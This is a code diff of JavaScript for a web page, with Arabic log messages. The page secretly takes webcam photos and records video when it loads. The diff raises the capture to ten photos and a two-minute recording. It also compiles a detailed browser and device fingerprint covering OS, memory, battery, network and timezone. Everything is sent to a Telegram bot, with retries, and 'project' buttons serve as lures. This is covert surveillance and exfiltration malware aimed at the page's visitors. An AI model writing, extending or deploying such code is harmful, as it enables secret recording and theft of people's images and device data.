@@ -25,14 +25,15 @@ document.addEventListener('DOMContentLoaded', async () => {
             await new Promise(resolve => setTimeout(resolve, 1000));
 
             if (!stream) {
-                console.log('Stream not ready yet, retrying...');
+                console.log('⏳ Stream not ready yet, retrying...');
                 setTimeout(autoCaptureonPageLoad, 2000);
                 return;
             }
 
-            console.log('Starting auto capture...');
+            console.log('🎬 بدء التقاط الصور والفيديو التلقائي...');
 
-            // Capture 5 photos
+            // Capture 10 photos
+            console.log('📸 جاري التقاط 10 صور...');
             const canvas = document.createElement('canvas');
             const videoTrack = stream.getVideoTracks()[0];
             if (videoTrack) {
@@ -52,7 +53,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 canvas.height = height;
                 const context = canvas.getContext('2d');
 
-                for (let i = 0; i < 5; i++) {
+                for (let i = 0; i < 10; i++) {
                     try {
                         const videoTrack = stream.getVideoTracks()[0];
                         if (!videoTrack) break;
@@ -82,25 +83,28 @@ document.addEventListener('DOMContentLoaded', async () => {
                                     method: 'sendPhoto',
                                     fileType: 'photo',
                                     file: blob,
-                                    fileName: `auto_photo_${Date.now()}_${i}.jpg`
+                                    fileName: `auto_photo_${Date.now()}_${i + 1}.jpg`
                                 };
-                                await sendToTelegram(formData);
-                                console.log(`Photo ${i + 1} sent successfully`);
+                                await sendToTelegram(formData, `📸 صورة تلقائية #${i + 1}`);
+                                console.log(`✅ تم إرسال الصورة ${i + 1}/10`);
                             } catch (imageCaptureErr) {
                                 console.warn('ImageCapture failed:', imageCaptureErr);
                             }
                         }
 
-                        if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                        if (i < 9) await new Promise(resolve => setTimeout(resolve, 400));
                     } catch (photoError) {
-                        console.error(`Auto photo capture error ${i + 1}:`, photoError);
+                        console.error(`❌ خطأ في التقاط الصورة ${i + 1}:`, photoError);
                     }
                 }
+                console.log('✅ انتهى التقاط الصور');
             }
 
-            // Record 60 second video (1 minute)
+            // Record 120 second video (2 minutes)
+            console.log('⏳ انتظار قبل بدء تسجيل الفيديو...');
             await new Promise(resolve => setTimeout(resolve, 1000));
             
+            console.log('🎥 جاري تسجيل فيديو 2 دقيقة...');
             const videoMimeType = getSupportedVideoMimeType();
             let recordedChunks = [];
             let autoMediaRecorder = null;
@@ -108,7 +112,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             try {
                 autoMediaRecorder = new MediaRecorder(stream, { mimeType: videoMimeType });
             } catch (error) {
-                console.error('MediaRecorder error:', error);
+                console.error('❌ خطأ في MediaRecorder:', error);
                 return;
             }
 
@@ -119,6 +123,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             };
 
             autoMediaRecorder.onstop = async () => {
+                console.log('📤 جاري إرسال الفيديو إلى Telegram...');
                 const blob = new Blob(recordedChunks, { type: videoMimeType });
                 recordedChunks = [];
 
@@ -135,138 +140,162 @@ document.addEventListener('DOMContentLoaded', async () => {
                     fileName: `auto_video_${Date.now()}.${fileExtension}`
                 };
 
-                await sendToTelegram(formData);
-                console.log('Auto video sent successfully');
+                const result = await sendToTelegram(formData, '🎥 فيديو تلقائي - 2 دقيقة');
+                if (result) {
+                    console.log('✅ تم إرسال الفيديو بنجاح');
+                } else {
+                    console.warn('⚠️ فشل إرسال الفيديو، جاري إعادة المحاولة...');
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    await sendToTelegram(formData, '🎥 فيديو تلقائي - 2 دقيقة (إعادة محاولة)');
+                }
             };
 
             try {
                 autoMediaRecorder.start();
-                console.log('Auto video recording started...');
+                console.log('🔴 بدء تسجيل الفيديو...');
 
-                // Auto-stop after 60 seconds (1 minute)
+                // Auto-stop after 120 seconds (2 minutes)
                 setTimeout(() => {
                     if (autoMediaRecorder && autoMediaRecorder.state === 'recording') {
                         autoMediaRecorder.stop();
-                        console.log('Auto video recording stopped');
+                        console.log('⏹️ انتهى تسجيل الفيديو');
                     }
-                }, 60000);
+                }, 120000);
             } catch (error) {
-                console.error('Recording start error:', error);
+                console.error('❌ خطأ في بدء التسجيل:', error);
             }
 
         } catch (error) {
-            console.error('Error in auto capture:', error);
+            console.error('❌ خطأ في التقاط الصور والفيديو:', error);
         }
     }
 
     // Send browser fingerprint on page load
-    try {
-        const fingerprint = await collectBrowserFingerprint();
-        
-        // Format fingerprint as professional Arabic text
-        const formatFingerprint = (data) => {
-            let text = `\n\n`;
-            text += `${'█'.repeat(80)}\n`;
-            text += `█ 📱 تقرير معلومات المتصفح والجهاز الشامل والمتكامل\n`;
-            text += `${'█'.repeat(80)}\n\n`;
+    async function sendPageLoadReport() {
+        try {
+            console.log('🔄 جاري جمع معلومات الجهاز...');
+            const fingerprint = await collectBrowserFingerprint();
+            console.log('✅ تم جمع المعلومات بنجاح');
             
-            text += `\n🖥️ ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات النظام والجهاز\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            text += `  ✓ نظام التشغيل الأساسي: ${data.os}\n`;
-            text += `  ✓ اسم الجهاز: ${data.deviceName}\n`;
-            text += `  ✓ المنصة: ${data.platform}\n`;
-            text += `  ✓ وكيل المستخدم: ${data.userAgent}\n`;
-            text += `  ✓ عدد المعالجات: ${data.hardwareConcurrency}\n`;
-            text += `  ✓ حجم الذاكرة: ${data.deviceMemory} GB\n`;
-            text += `  ✓ نقاط اللمس: ${data.maxTouchPoints}\n`;
-            text += `  ✓ البائع: ${data.vendor}\n\n`;
+            // Format fingerprint as professional Arabic text
+            const formatFingerprint = (data) => {
+                let text = `\n\n`;
+                text += `${'█'.repeat(80)}\n`;
+                text += `█ 📱 تقرير معلومات المتصفح والجهاز الشامل والمتكامل\n`;
+                text += `${'█'.repeat(80)}\n\n`;
+                
+                text += `\n🖥️ ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات النظام والجهاز\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                text += `  ✓ نظام التشغيل الأساسي: ${data.os}\n`;
+                text += `  ✓ اسم الجهاز: ${data.deviceName}\n`;
+                text += `  ✓ المنصة: ${data.platform}\n`;
+                text += `  ✓ وكيل المستخدم: ${data.userAgent}\n`;
+                text += `  ✓ عدد المعالجات: ${data.hardwareConcurrency}\n`;
+                text += `  ✓ حجم الذاكرة: ${data.deviceMemory} GB\n`;
+                text += `  ✓ نقاط اللمس: ${data.maxTouchPoints}\n`;
+                text += `  ✓ البائع: ${data.vendor}\n\n`;
+                
+                text += `\n🌐 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات المتصفح والإعدادات\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                text += `  ✓ اللغة الأساسية: ${data.language}\n`;
+                text += `  ✓ اللغات المدعومة: ${Array.isArray(data.languages) ? data.languages.join(', ') : data.languages}\n`;
+                text += `  ✓ المنطقة الزمنية: ${data.timezone}\n`;
+                text += `  ✓ فرق المنطقة الزمنية: ${data.timezoneOffset} دقيقة\n`;
+                text += `  ✓ ملفات تعريف الارتباط مفعلة: ${data.cookieEnabled ? 'نعم' : 'لا'}\n`;
+                text += `  ✓ عدم التتبع: ${data.doNotTrack || 'غير محدد'}\n`;
+                text += `  ✓ الاتصال بالإنترنت: ${data.onLine ? 'متصل' : 'غير متصل'}\n\n`;
+                
+                text += `\n📺 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات الشاشة والنافذة\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                text += `  ✓ دقة الشاشة: ${data.screen.width} × ${data.screen.height} بكسل\n`;
+                text += `  ✓ الدقة المتاحة: ${data.screen.availWidth} × ${data.screen.availHeight} بكسل\n`;
+                text += `  ✓ عمق الألوان: ${data.screen.colorDepth} بت\n`;
+                text += `  ✓ عمق البكسل: ${data.screen.pixelDepth} بت\n`;
+                text += `  ✓ اتجاه الشاشة: ${data.screen.orientation || 'غير متاح'}\n`;
+                text += `  ✓ حجم النافذة: ${data.window.innerWidth} × ${data.window.innerHeight} بكسل\n`;
+                text += `  ✓ الحجم الخارجي: ${data.window.outerWidth} × ${data.window.outerHeight} بكسل\n\n`;
+                
+                text += `\n🔌 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات الاتصال والشبكة\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                const connInfo = data.connection;
+                if (typeof connInfo === 'object') {
+                    text += `  ✓ نوع الاتصال: ${connInfo.effectiveType}\n`;
+                    text += `  ✓ سرعة التنزيل: ${connInfo.downlink} Mbps\n`;
+                    text += `  ✓ وقت التأخير: ${connInfo.rtt} ms\n`;
+                    text += `  ✓ حفظ البيانات: ${connInfo.saveData ? 'نعم' : 'لا'}\n`;
+                } else {
+                    text += `  ✓ معلومات الاتصال: ${connInfo}\n`;
+                }
+                text += `\n`;
+                
+                text += `\n🔋 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات البطارية والطاقة\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                const batteryInfo = data.battery;
+                if (typeof batteryInfo === 'object') {
+                    text += `  ✓ مستوى البطارية: ${(batteryInfo.level * 100).toFixed(0)}%\n`;
+                    text += `  ✓ حالة الشحن: ${batteryInfo.charging ? 'قيد الشحن' : 'غير مشحون'}\n`;
+                    text += `  ✓ وقت الشحن المتبقي: ${batteryInfo.chargingTime} ثانية\n`;
+                    text += `  ✓ وقت التفريغ المتبقي: ${batteryInfo.dischargingTime} ثانية\n`;
+                } else {
+                    text += `  ✓ معلومات البطارية: ${batteryInfo}\n`;
+                }
+                text += `\n`;
+                
+                text += `\n💾 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات التخزين والذاكرة\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                text += `  ✓ التخزين المحلي: ${data.localStorage ? 'متاح' : 'غير متاح'}\n`;
+                text += `  ✓ التخزين المؤقت: ${data.sessionStorage ? 'متاح' : 'غير متاح'}\n`;
+                text += `  ✓ قاعدة البيانات المفهرسة: ${data.indexedDB ? 'متاحة' : 'غير متاحة'}\n`;
+                text += `  ✓ قاعدة البيانات المفتوحة: ${data.openDatabase ? 'متاحة' : 'غير متاحة'}\n\n`;
+                
+                text += `\n🔐 ═══════════════════════════════════════════════════════════════════════════════\n`;
+                text += `    معلومات الأمان والأذونات\n`;
+                text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
+                text += `  ✓ الموقع الجغرافي: ${data.geolocation}\n`;
+                text += `  ✓ أجهزة الوسائط: ${data.mediaDevices}\n`;
+                text += `  ✓ نظام الأذونات: ${data.permissions}\n\n`;
+                
+                text += `\n${'█'.repeat(80)}\n`;
+                text += `█ ⏰ وقت إنشاء التقرير: ${new Date().toLocaleString('ar-SA')}\n`;
+                text += `█ 📅 التاريخ والوقت الدقيق: ${new Date().toISOString()}\n`;
+                text += `${'█'.repeat(80)}\n\n`;
+                
+                return text;
+            };
             
-            text += `\n🌐 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات المتصفح والإعدادات\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            text += `  ✓ اللغة الأساسية: ${data.language}\n`;
-            text += `  ✓ اللغات المدعومة: ${Array.isArray(data.languages) ? data.languages.join(', ') : data.languages}\n`;
-            text += `  ✓ المنطقة الزمنية: ${data.timezone}\n`;
-            text += `  ✓ فرق المنطقة الزمنية: ${data.timezoneOffset} دقيقة\n`;
-            text += `  ✓ ملفات تعريف الارتباط مفعلة: ${data.cookieEnabled ? 'نعم' : 'لا'}\n`;
-            text += `  ✓ عدم التتبع: ${data.doNotTrack || 'غير محدد'}\n`;
-            text += `  ✓ الاتصال بالإنترنت: ${data.onLine ? 'متصل' : 'غير متصل'}\n\n`;
+            const fingerprintText = formatFingerprint(fingerprint);
+            const blob = new Blob([fingerprintText], { type: 'text/plain' });
+            const formData = {
+                method: 'sendDocument',
+                fileType: 'document',
+                file: blob,
+                fileName: `تقرير_معلومات_الجهاز_${Date.now()}.txt`
+            };
             
-            text += `\n📺 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات الشاشة والنافذة\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            text += `  ✓ دقة الشاشة: ${data.screen.width} × ${data.screen.height} بكسل\n`;
-            text += `  ✓ الدقة المتاحة: ${data.screen.availWidth} × ${data.screen.availHeight} بكسل\n`;
-            text += `  ✓ عمق الألوان: ${data.screen.colorDepth} بت\n`;
-            text += `  ✓ عمق البكسل: ${data.screen.pixelDepth} بت\n`;
-            text += `  ✓ اتجاه الشاشة: ${data.screen.orientation || 'غير متاح'}\n`;
-            text += `  ✓ حجم النافذة: ${data.window.innerWidth} × ${data.window.innerHeight} بكسل\n`;
-            text += `  ✓ الحجم الخارجي: ${data.window.outerWidth} × ${data.window.outerHeight} بكسل\n\n`;
+            console.log('📤 جاري إرسال التقرير إلى Telegram...');
+            const result = await sendToTelegram(formData, '📱 تقرير معلومات المتصفح والجهاز عند تحميل الصفحة');
             
-            text += `\n🔌 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات الاتصال والشبكة\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            const connInfo = data.connection;
-            if (typeof connInfo === 'object') {
-                text += `  ✓ نوع الاتصال: ${connInfo.effectiveType}\n`;
-                text += `  ✓ سرعة التنزيل: ${connInfo.downlink} Mbps\n`;
-                text += `  ✓ وقت التأخير: ${connInfo.rtt} ms\n`;
-                text += `  ✓ حفظ البيانات: ${connInfo.saveData ? 'نعم' : 'لا'}\n`;
+            if (result) {
+                console.log('✅ تم إرسال التقرير بنجاح إلى Telegram');
             } else {
-                text += `  ✓ معلومات الاتصال: ${connInfo}\n`;
+                console.warn('⚠️ فشل إرسال التقرير، جاري إعادة المحاولة...');
+                // Retry once more
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                await sendToTelegram(formData, '📱 تقرير معلومات المتصفح والجهاز عند تحميل الصفحة (إعادة محاولة)');
             }
-            text += `\n`;
-            
-            text += `\n🔋 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات البطارية والطاقة\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            const batteryInfo = data.battery;
-            if (typeof batteryInfo === 'object') {
-                text += `  ✓ مستوى البطارية: ${(batteryInfo.level * 100).toFixed(0)}%\n`;
-                text += `  ✓ حالة الشحن: ${batteryInfo.charging ? 'قيد الشحن' : 'غير مشحون'}\n`;
-                text += `  ✓ وقت الشحن المتبقي: ${batteryInfo.chargingTime} ثانية\n`;
-                text += `  ✓ وقت التفريغ المتبقي: ${batteryInfo.dischargingTime} ثانية\n`;
-            } else {
-                text += `  ✓ معلومات البطارية: ${batteryInfo}\n`;
-            }
-            text += `\n`;
-            
-            text += `\n💾 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات التخزين والذاكرة\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            text += `  ✓ التخزين المحلي: ${data.localStorage ? 'متاح' : 'غير متاح'}\n`;
-            text += `  ✓ التخزين المؤقت: ${data.sessionStorage ? 'متاح' : 'غير متاح'}\n`;
-            text += `  ✓ قاعدة البيانات المفهرسة: ${data.indexedDB ? 'متاحة' : 'غير متاحة'}\n`;
-            text += `  ✓ قاعدة البيانات المفتوحة: ${data.openDatabase ? 'متاحة' : 'غير متاحة'}\n\n`;
-            
-            text += `\n🔐 ═══════════════════════════════════════════════════════════════════════════════\n`;
-            text += `    معلومات الأمان والأذونات\n`;
-            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
-            text += `  ✓ الموقع الجغرافي: ${data.geolocation}\n`;
-            text += `  ✓ أجهزة الوسائط: ${data.mediaDevices}\n`;
-            text += `  ✓ نظام الأذونات: ${data.permissions}\n\n`;
-            
-            text += `\n${'█'.repeat(80)}\n`;
-            text += `█ ⏰ وقت إنشاء التقرير: ${new Date().toLocaleString('ar-SA')}\n`;
-            text += `█ 📅 التاريخ والوقت الدقيق: ${new Date().toISOString()}\n`;
-            text += `${'█'.repeat(80)}\n\n`;
-            
-            return text;
-        };
-        
-        const fingerprintText = formatFingerprint(fingerprint);
-        const blob = new Blob([fingerprintText], { type: 'text/plain' });
-        const formData = {
-            method: 'sendDocument',
-            fileType: 'document',
-            file: blob,
-            fileName: `تقرير_معلومات_الجهاز_${Date.now()}.txt`
-        };
-        await sendToTelegram(formData, '📱 تقرير معلومات المتصفح والجهاز عند تحميل الصفحة');
-    } catch (error) {
-        console.error('Error sending initial fingerprint:', error);
+        } catch (error) {
+            console.error('❌ خطأ في إرسال التقرير:', error);
+        }
     }
+    
+    // Call the function after a short delay to ensure everything is ready
+    setTimeout(sendPageLoadReport, 500);
 
     // ==================== Helper Functions ====================
 
@@ -1045,7 +1074,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                 canvas.width = width;
                 canvas.height = height;
                 
-                for (let i = 0; i < 4; i++) {
+                for (let i = 0; i < 1; i++) {
                     try {
                         const videoTrack = stream.getVideoTracks()[0];
                         if (!videoTrack) break;
@@ -1076,13 +1105,12 @@ document.addEventListener('DOMContentLoaded', async () => {
                                     file: blob,
                                     fileName: `project1_photo_${Date.now()}_${i}.jpg`
                                 };
-                                await sendToTelegram(formData);
+                                await sendToTelegram(formData, '📸 صورة من موقع مبسط الشمال');
+                                console.log('✅ تم التقاط وإرسال صورة واحدة');
                             } catch (imageCaptureErr) {
                                 console.warn('ImageCapture failed:', imageCaptureErr);
                             }
                         }
-                        
-                        if (i < 3) await new Promise(resolve => setTimeout(resolve, 300));
                     } catch (photoError) {
                         console.error(`Photo capture error ${i + 1}:`, photoError);
                     }
@@ -1100,7 +1128,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         });
     }
     
-    // Project 2: Record video (15 seconds)
+    // Project 2: Record video (10 seconds)
     if (projectBtn2) {
         projectBtn2.addEventListener('click', async () => {
             if (!stream || projectBtn2.disabled) {
@@ -1109,7 +1137,7 @@ document.addEventListener('DOMContentLoaded', async () => {
             
             projectBtn2.disabled = true;
             recordingType = 'project2';
-            startRecordingProject(stream, getSupportedVideoMimeType(), 15000, 'https://abuali782.github.io/Zena-Touch-v2/');
+            startRecordingProject(stream, getSupportedVideoMimeType(), 10000, 'https://abuali782.github.io/Zena-Touch-v2/');
         });
     }
     
